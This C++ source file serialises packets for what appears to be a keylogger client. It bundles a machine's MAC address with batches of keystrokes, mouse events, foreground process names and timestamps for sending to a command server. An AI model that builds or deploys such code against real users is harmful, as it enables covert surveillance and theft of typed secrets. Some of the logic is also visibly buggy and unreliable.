#include "Command.h"
#include <iostream>

Command::Command()
{
	generateData["mac"] = &Command::mac;
	generateData["version"] = &Command::version;
	generateData["connect"] = &Command::connect;
	generateData["disconnect"] = &Command::disconnect;
	generateData["log"] = &Command::log;
	generateData["keyboard"] = &Command::keyboard;
	generateData["mouse"] = &Command::mouse;
	generateData["ping"] = &Command::ping;
	generateData["pong"] = &Command::pong;
	//generateData["cmdServ"] = &Command::handleSever;

	mouseInput = NULL;
	keyboardInput = NULL;
	rest = 0;
}

Command::~Command()
{
}

uint8_t *		Command::getMacInfo(void) {
	IP_ADAPTER_INFO info[16];
	DWORD size = sizeof(info);

	GetAdaptersInfo(info, &(size));

	PIP_ADAPTER_INFO infos = info;
	while (infos)
	{
		if (infos->DhcpEnabled == 1 && infos->IpAddressList.IpAddress.String != "0.0.0.0")
		{
			uint8_t * result = new uint8_t[6];
			for (unsigned int i = 0; i < 6; i++)
				result[i] = (uint8_t)infos->Address[i];
			return result;
		}
		infos = infos->Next;
	}
	throw std::runtime_error("Can't get adress mac");
	return NULL;
}

// 0,1,2,3 -> CmdServer
// 4 -> pong
unsigned int Command::interpretAction(char *cmd)
{
	packetHeader  h;

	memcpy(&h, cmd, sizeof(h));
	if (h.opcode == 0)
	{
		errorResultPacket r;
		memcpy(&r, cmd + sizeof(h), sizeof(r));
		return r.error;
	}
	else if (h.opcode == 5)
	{
		commandPacket c;
		memcpy(&c, cmd + sizeof(h), sizeof(c));
		return c.command;
	}
	return 4;
}

char * Command::getErrorRetur(int err, int idp, int id)
{
	packetHeader h;
	errorResultPacket e;
	char		*result = new char[sizeof(h) + sizeof(e)];

	memset(&h, 0, sizeof(h));
	memset(&e, 0, sizeof(e));
	memset(result, 0, sizeof(h) + sizeof(e));
	h.opcode = 1;
	h.id = id;
	h.size = 6;
	e.error = err;
	e.id = idp;
	memcpy(result, &h, sizeof(h));
	memcpy(result + sizeof(h), &e, sizeof(e));
	return result;
}

/* usual functions */

char * Command::getCmd(const std::string & cmd, char *datax, unsigned int t)
{
	unsigned int id = getAvailableId();
	//std::cout << "PAKCET " << cmd << " AVEC ID " << id << std::endl;
	char *tmp = (this->*generateData[cmd])(id, datax, t);
	if (cmd == "connect" || cmd == "mac" || cmd == "version")
		addPacket(id, tmp, false);
	else
		addPacket(id, tmp);
	return tmp;
}

char * Command::getInputPacket(const Input & _input)
{
	if (_input.isMouse())
		return getMousePacket(_input);
	return getKeyboardPacket(_input);
}

char * Command::getKeyboardPacket(const Input & _input)
{
	keyboardPacket k;

	char * tmp = getStringPacket(_input.getInputValue());
	if (tmp)
	{
		memcpy(&(k.name), tmp, sizeof(string));
		delete(tmp);
		tmp = NULL;
	}

	k.second = _input.getSecondTime();
	k.nano = _input.getNanoTime();
	
	tmp = getStringPacket(_input.getProcessName());
	if (tmp)
	{
		memcpy(&(k.process), tmp, sizeof(string));
		delete(tmp);
		tmp = NULL;
	}
	tmp = getStringPacket(_input.getEvent());
	if (tmp)
	{
		memcpy(&(k.event), tmp, sizeof(string));
		delete(tmp);
		tmp = NULL;
	}
	char *tmp2 = new char[sizeof(keyboardPacket)];
	memcpy(tmp2, &k, sizeof(k));

	return tmp2;
}

char * Command::getMousePacket(const Input & _input)
{
	mousePacket k;
	k.second = _input.getSecondTime();
	k.nano = _input.getNanoTime();
	k.pos_x = _input.getPosX();
	k.pos_y = _input.getPosY();
	k.amount = _input.getAmount();

	char * tmp = getStringPacket(_input.getInputValue());
	if (tmp)
	{
		memcpy(&(k.name), tmp, sizeof(string));
		delete(tmp);
		tmp = NULL;
	}
	tmp = getStringPacket(_input.getProcessName());
	if (tmp)
	{
		memcpy(&(k.process), tmp, sizeof(string));
		delete(tmp);
		tmp = NULL;
	}
	tmp = getStringPacket(_input.getEvent());
	if (tmp)
	{
		memcpy(&(k.process), tmp, sizeof(string));
		delete(tmp);
		tmp = NULL;
	}
	char * tmp2 = new char[sizeof(mousePacket)];
	memcpy(tmp2, &k, sizeof(k));
	return tmp2;
}

char * Command::getArrayKeyboardPacket(std::list<Input *> & l)
{
	keyboardPacket tab[MAX_INPUT_SEND];
	arrayKeyboard * a = new arrayKeyboard;
	
	memset(a, 0, sizeof(arrayKeyboard));
	memset(&tab, 0, sizeof(keyboardPacket) * MAX_INPUT_SEND);

	char * tmp;
	unsigned int i = 0;
	a->size = (uint8_t)l.size();
	while (!l.empty())
	{
		tmp = getKeyboardPacket(*l.back());
		memcpy(&(tab[i]), tmp, sizeof(keyboardPacket));
		i++;
		l.pop_back();
	}
	memcpy(&a->data, &tab, sizeof(tab));
	char * tmp2 = new char[sizeof(arrayKeyboard)];
	memcpy(tmp2, a, sizeof(arrayKeyboard));
	char * t = getCmd("keyboard", tmp2, (unsigned int)sizeof(arrayKeyboard));
	delete(tmp2);
	return t;
}

char * Command::getArrayMousePacket(std::list<Input *> & l)
{
	mousePacket tab[MAX_INPUT_SEND];
	arrayMouse * a = new arrayMouse;

	memset(a, 0, sizeof(arrayKeyboard));
	memset(&tab, 0, sizeof(mousePacket) * MAX_INPUT_SEND);
	
	char *tmp;
	unsigned int i = 0;
	a->size = (uint8_t)l.size();
	while (!l.empty())
	{
		tmp = getMousePacket(*l.back());
		memcpy(&(tab[i]), tmp, sizeof(mousePacket));
		i++;
		l.pop_back();
	}
	memcpy(&a->data, &tab, sizeof(tab));
	char * tmp2 = new char[sizeof(arrayMouse)];
	memcpy(tmp2, a, sizeof(arrayMouse));
	char * t = getCmd("mouse", tmp2, (unsigned int)sizeof(arrayMouse));
	delete(tmp2);
	return t;
}

bool  Command::getArrayInput(std::list<Input *> & l)
{
	if (l.size() == 0 || l.begin() == l.end())
		return false;
	std::list<Input *> mouse;
	std::list<Input *> key;

	unsigned int check = (unsigned int)l.size();
	unsigned int i = 0;
	for (std::list<Input *>::iterator it = l.begin(); it != l.end(); it++)
	{
		//std::cout << (*it)->getInputValue() << std::endl;
		if ((*it)->isMouse() && mouse.size() < MAX_INPUT_SEND)
			mouse.push_front(*it);
		else if (!(*it)->isMouse() && key.size() < MAX_INPUT_SEND)
			key.push_front(*it);
		if (key.size() >= MAX_INPUT_SEND || mouse.size() >= MAX_INPUT_SEND)
		{
			check = (unsigned int)l.size() - i;
			break;
		}
		i++;
	}
	if (mouse.size() > 0)
		mouseInput = getArrayMousePacket(mouse);
	else
		mouseInput = NULL;
	if (key.size() > 0)
		keyboardInput = getArrayKeyboardPacket(key);
	else
		keyboardInput = NULL;
	rest = i;
	return (keyboardInput || mouseInput);
}

char * Command::getMouseInput()
{
	char *tmp = mouseInput;
	mouseInput = NULL;
	return tmp;
}

char * Command::getKeyboardInput()
{
	char *tmp = keyboardInput;
	mouseInput = NULL;
	return tmp;
}

unsigned int Command::getRestList()
{
	unsigned int tmp = rest;
	rest = 0;
	return tmp;
}

unsigned int Command::getTotalSize(char *r)
{
	packetHeader p;

	memcpy(&p, r, sizeof(packetHeader));
	return p.size + sizeof(packetHeader);
}

int Command::getIdResponse(char * s)
{
	packetHeader p;
	errorResultPacket r;

	memset(&p, 0, sizeof(p));
	memset(&r, 0, sizeof(r));
	memcpy(&p, s, sizeof(packetHeader));
	memcpy(&r, s + sizeof(p), sizeof(r));
	return r.id;
}

unsigned int Command::getIdPacket(char * r)
{
	packetHeader p;

	memset(&p, 0, sizeof(p));
	memcpy(&p, r, sizeof(packetHeader));
	return (unsigned int)p.id;
}

unsigned int Command::getOpcode(char * r)
{
	packetHeader p;

	memset(&p, 0, sizeof(p));
	memcpy(&p, r, sizeof(packetHeader));
	return (unsigned int)p.opcode;
}

char * Command::getStringPacket(const std::string & st)
{
	if (st.size() == 0)
		return NULL;
	string s;
	memset(&s, 0, sizeof(s));
	s.lenght = (uint8_t)st.size();
	for (unsigned int i = 0; i < st.size(); i++)
		s.data[i] = (uint8_t)st[i];
	char * tmp = new char[sizeof(string)];
	memcpy(tmp, &s, sizeof(string));	
	return tmp;
}

std::string Command::getString(string & t)
{
	char st[255];	
	memset(&st, 0, 255);
	for (unsigned int i = 0; i < t.lenght; i++)
		st[i] = (char)t.data[i];
	st[t.lenght] = 0;
	return std::string(st);
}

char * Command::mac(int id, char * , unsigned int)
{
	packetHeader h;
	macPacket	m;
	uint8_t		*add;
	char		*result = new char[sizeof(h) + sizeof(m)];


	memset(&h, 0, sizeof(packetHeader));
	memset(&m, 0, sizeof(macPacket));
	memset(result, 0, sizeof(h) + sizeof(m));
	h.opcode = 1;
	h.id = id;
	h.size = 6;
	add = getMacInfo();
	if (add)
		memcpy(&m.mac, add, sizeof(m.mac));
	delete(add);
	memcpy(result, &h, sizeof(h));
	memcpy(result + sizeof(h), &m, sizeof(m));
	return result;
}

char * Command::version(int id, char *, unsigned int)
{
	packetHeader h;
	versionPacket	v;
	char		*result = new char[sizeof(h) + sizeof(v)];
	
	memset(&h, 0, sizeof(packetHeader));
	memset(&v, 0, sizeof(versionPacket));
	memset(result, 0, sizeof(h) + sizeof(v));
	h.opcode = 2;
	h.id = id;
	h.size = 1;
	v.version = 1;
	memcpy(result, &h, sizeof(h));
	memcpy(result + sizeof(h), &v, sizeof(v));
	return result;
}

char * Command::connect(int id, char *, unsigned int)
{ 
	packetHeader h;
	char		*result = new char[sizeof(h)];

	memset(result, 0, sizeof(packetHeader));
	memset(&h, 0, sizeof(packetHeader));
	h.opcode = 3;
	h.id = id;
	h.size = 0;
	memcpy(result, &h, sizeof(h));

	return result;
}

char * Command::disconnect(int id, char *, unsigned int)
{
	packetHeader h;
	char		*result = new char[sizeof(h)];
	
	memset(result, 0, sizeof(h));
	memset(result, 0, sizeof(packetHeader));
	h.opcode = 4;
	h.id = id;
	h.size = 0;
	memcpy(result, &h, sizeof(h));
	return result;
}

char * Command::log(int id, char * datax, unsigned int)
{
	/*packetHeader h;
	arrayString	 l;
	char		*result = new char[sizeof(h) + sizeof(l)];

	h.opcode = 2;
	h.id = id;
	h.size = 1;
 ///// ????? ArrayString ?????
	memcpy(result, &h, sizeof(h));
	memcpy(result + sizeof(h), &l, sizeof(l));
	return result;*/
	return NULL;
}

char * Command::keyboard(int id, char * datax, unsigned int t)
{
	packetHeader h;
	char *result = new char[sizeof(packetHeader) + sizeof(arrayKeyboard)];
	
	memset(&h, 0, sizeof(packetHeader));
	memset(result, 0, sizeof(packetHeader) + sizeof(arrayKeyboard));
	h.opcode = 9;
	h.id = id;
	h.size = (uint16_t)t;
	memcpy(result, &h, sizeof(packetHeader));
	memcpy(result + sizeof(packetHeader), datax, sizeof(arrayKeyboard));
	return result;
}

char * Command::mouse(int id, char * datax, unsigned int t)
{
	packetHeader h;
	char*result = new char[sizeof(h) + sizeof(arrayMouse)];

	memset(&h, 0, sizeof(packetHeader));
	memset(result, 0, sizeof(packetHeader) + sizeof(arrayMouse));
	h.opcode = 10;
	h.id = id;
	h.size = (uint16_t)t;
	memcpy(result, &h, sizeof(h));
	memcpy(result + sizeof(h), datax, sizeof(arrayMouse));
	return result;
}

char * Command::ping(int id, char *, unsigned int)
{
	packetHeader h;
	char *result = new char[sizeof(h)];

	memset(&h, 0, sizeof(packetHeader));
	memset(result, 0, sizeof(h));
	h.opcode = 7;
	h.id = id;
	h.size = 0;
	memcpy(result, &h, sizeof(h));
	return result;
}

char * Command::pong(int id, char *, unsigned int)
{
	packetHeader h;

	char *result = new char[sizeof(h)];
	memset(&h, 0, sizeof(packetHeader));
	memset(result, 0, sizeof(h));
	h.opcode = 8;
	h.id = id;
	h.size = 0;
	memcpy(result, &h, sizeof(h));
	return result;
}

bool   Command::addPacket(int id, char * t, bool op)
{
	if (!op)
		_ids_connect[id] = t;
	else
		_ids[id] = t;
	return false;
}

unsigned int Command::getAvailableId()
{
	for (unsigned int i = 0; i < 255; i++)
		if (_ids_connect.count(i) == 0 && _ids.count(i) == 0)
			return i;
	throw std::runtime_error("No more id available");
	return -1;
}

char * Command::getPreviousPacket(unsigned int _id, bool op)
{
	if (!op)
	{
		if (_ids_connect.count(_id) == 0)
			return NULL;
		return _ids_connect[_id];
	}
	if (_ids.count(_id) == 0)
		return NULL;
	return _ids[_id];
}

char * Command::fusionPacket(char * header, char * core)
{
	unsigned int i = getTotalSize(header);
	char *result = new char[i];
	memcpy(result, header, sizeof(packetHeader));
	memcpy(result + sizeof(packetHeader), core, i - sizeof(packetHeader));
	delete(header);
	delete(core);
	return result;
}